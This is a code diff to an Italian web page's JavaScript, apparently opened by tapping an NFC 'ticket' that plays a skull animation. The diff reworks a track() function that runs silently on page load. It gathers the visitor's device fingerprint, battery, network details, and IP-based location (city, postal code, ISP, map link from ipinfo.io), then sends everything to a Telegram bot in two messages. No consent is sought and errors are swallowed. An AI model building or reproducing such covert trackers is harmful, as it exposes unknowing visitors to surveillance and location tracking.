@@ -637,7 +637,7 @@ async function boot() {
   await sleep(480);
   document.getElementById('p-skull').classList.add('on');
   document.body.style.animation = 'glitch .09s infinite';
-  await sleep(1800);
+  await sleep(4000);
   document.body.style.animation = '';
   document.getElementById('p-skull').classList.remove('on');
 
@@ -686,15 +686,11 @@ async function track() {
     const ua         = navigator.userAgent;
     const lang       = navigator.language || navigator.languages?.[0] || '—';
     const langs      = (navigator.languages || []).join(', ') || '—';
-    const platform   = navigator.platform || '—';
-    const vendor     = navigator.vendor   || '—';
     const cores      = navigator.hardwareConcurrency || '—';
     const memory     = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : '—';
     const touch      = navigator.maxTouchPoints > 0
-                       ? `sì (${navigator.maxTouchPoints} punti)` : 'no';
-    const cookieOk   = navigator.cookieEnabled ? 'sì' : 'no';
-    const doNotTrack = navigator.doNotTrack || '—';
-    const online     = navigator.onLine ? 'sì' : 'no';
+                       ? `si (${navigator.maxTouchPoints} punti)` : 'no';
+    const cookieOk   = navigator.cookieEnabled ? 'si' : 'no';
 
     /* ── schermo ── */
     const sw   = screen.width,  sh   = screen.height;
@@ -710,25 +706,21 @@ async function track() {
 
     /* ── connessione ── */
     const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-    const connType   = conn?.effectiveType || '—';
-    const connDown   = conn?.downlink ? conn.downlink + ' Mbps' : '—';
-    const connSave   = conn?.saveData ? 'sì' : 'no';
+    const connType = conn?.effectiveType || '—';
+    const connDown = conn?.downlink ? conn.downlink + ' Mbps' : '—';
 
-    /* ── referrer ── */
-    const ref = document.referrer || '— (NFC diretto)';
-
-    /* ── OS parsing dal UA ── */
-    let os = '—';
+    /* ── OS parsing ── */
+    let os = 'Sconosciuto';
     if (/Windows NT 10/i.test(ua))        os = 'Windows 10/11';
     else if (/Windows NT 6\.1/i.test(ua)) os = 'Windows 7';
     else if (/Mac OS X/i.test(ua))        os = 'macOS';
-    else if (/iPhone/i.test(ua))          os = 'iPhone / iOS';
-    else if (/iPad/i.test(ua))            os = 'iPad / iPadOS';
+    else if (/iPhone/i.test(ua))          os = 'iPhone iOS';
+    else if (/iPad/i.test(ua))            os = 'iPad iPadOS';
     else if (/Android/i.test(ua))         os = 'Android';
     else if (/Linux/i.test(ua))           os = 'Linux';
 
     /* ── browser parsing ── */
-    let browser = '—';
+    let browser = 'Sconosciuto';
     if (/CriOS/i.test(ua))        browser = 'Chrome iOS';
     else if (/FxiOS/i.test(ua))   browser = 'Firefox iOS';
     else if (/EdgA/i.test(ua))    browser = 'Edge Android';
@@ -736,69 +728,61 @@ async function track() {
     else if (/Chrome/i.test(ua) && !/Chromium/i.test(ua)) browser = 'Chrome';
     else if (/Firefox/i.test(ua)) browser = 'Firefox';
     else if (/Safari/i.test(ua))  browser = 'Safari';
-    else if (/MSIE|Trident/i.test(ua)) browser = 'Internet Explorer';
 
-    /* ── geo via ipinfo.io ── */
-    const geo     = await fetch('https://ipinfo.io/json').then(r => r.json()).catch(() => ({}));
-    const ip      = geo.ip       || '—';
-    const city    = geo.city     || '—';
-    const region  = geo.region   || '—';
-    const country = geo.country  || '—';
-    const org     = geo.org      || '—';
-    const coords  = geo.loc      || '';
-    const mapLink = coords ? `https://maps.google.com/?q=${coords}` : '—';
-    const postal  = geo.postal   || '—';
-
-    /* ── batteria (dove supportata) ── */
+    /* ── batteria ── */
     let battery = '—';
-    if (navigator.getBattery) {
-      const b = await navigator.getBattery().catch(() => null);
-      if (b) battery = `${Math.round(b.level * 100)}% ${b.charging ? '⚡ in carica' : '🔋'}`;
-    }
+    try {
+      if (navigator.getBattery) {
+        const b = await navigator.getBattery();
+        if (b) battery = `${Math.round(b.level * 100)}% ${b.charging ? 'in carica' : 'non in carica'}`;
+      }
+    } catch(e) {}
 
-    /* ── messaggio Telegram ── */
-    const msg = [
+    /* ── PING IMMEDIATO senza geo ── */
+    const sendTG = async (text) => {
+      await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: TG_CHAT_ID, text, disable_web_page_preview: true }),
+      });
+    };
+
+    await sendTG([
       `🔔 Biglietto NFC aperto!`,
       ``,
       `🕐 Quando: ${now}`,
-      `📍 Città: ${city}, ${region} (${country})`,
-      `🌐 IP: ${ip}`,
-      `🏢 Provider: ${org}`,
-      `📮 CAP: ${postal}`,
-      `🗺 Mappa: ${mapLink}`,
+      `🌍 Fuso: ${tz} (${tzStr})`,
       ``,
-      `📱 Dispositivo`,
-      `• OS: ${os}`,
-      `• Browser: ${browser}`,
-      `• Schermo: ${sw}x${sh} px (DPR ${sdpr})`,
-      `• Viewport: ${ww}x${wh} px`,
-      `• Colori: ${cDepth}`,
-      `• RAM: ${memory}`,
-      `• CPU core: ${cores}`,
-      `• Touch: ${touch}`,
-      `• Batteria: ${battery}`,
+      `📱 OS: ${os}`,
+      `🌐 Browser: ${browser}`,
+      `🖥 Schermo: ${sw}x${sh} (DPR ${sdpr})`,
+      `👁 Viewport: ${ww}x${wh}`,
+      `💾 RAM: ${memory}  |  CPU: ${cores} core`,
+      `👆 Touch: ${touch}`,
+      `🔋 Batteria: ${battery}`,
+      `📶 Rete: ${connType} - ${connDown}`,
+      `🌍 Lingua: ${lang}`,
       ``,
-      `🌍 Lingua: ${lang} [${langs}]`,
-      `🕐 Fuso orario: ${tz} (${tzStr})`,
-      `📶 Connessione: ${connType} - ${connDown}`,
-      `💾 Risparmio dati: ${connSave}`,
-      `🍪 Cookie: ${cookieOk}`,
-      `↩️ Referrer: ${ref}`,
-      ``,
-      `🔍 User Agent:`,
-      ua.slice(0, 300),
-    ].join('\n');
+      `📎 UA: ${ua.slice(0, 250)}`,
+    ].join('\n'));
 
-    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: TG_CHAT_ID,
-        text:    msg,
-        disable_web_page_preview: true,
-      }),
-    });
-  } catch (_) { /* silenzioso */ }
+    /* ── GEO (secondo messaggio) ── */
+    const geo = await fetch('https://ipinfo.io/json').then(r => r.json()).catch(() => null);
+    if (geo) {
+      const mapLink = geo.loc ? `https://maps.google.com/?q=${geo.loc}` : '—';
+      await sendTG([
+        `📍 Posizione per l'apertura precedente:`,
+        ``,
+        `🌐 IP: ${geo.ip || '—'}`,
+        `🏙 Citta: ${geo.city || '—'}, ${geo.region || '—'}`,
+        `🌍 Paese: ${geo.country || '—'}`,
+        `📮 CAP: ${geo.postal || '—'}`,
+        `🏢 Provider: ${geo.org || '—'}`,
+        `🗺 Mappa: ${mapLink}`,
+      ].join('\n'));
+    }
+
+  } catch(e) { /* silenzioso */ }
 }
 
 track(); // parte subito, in background, non blocca nulla
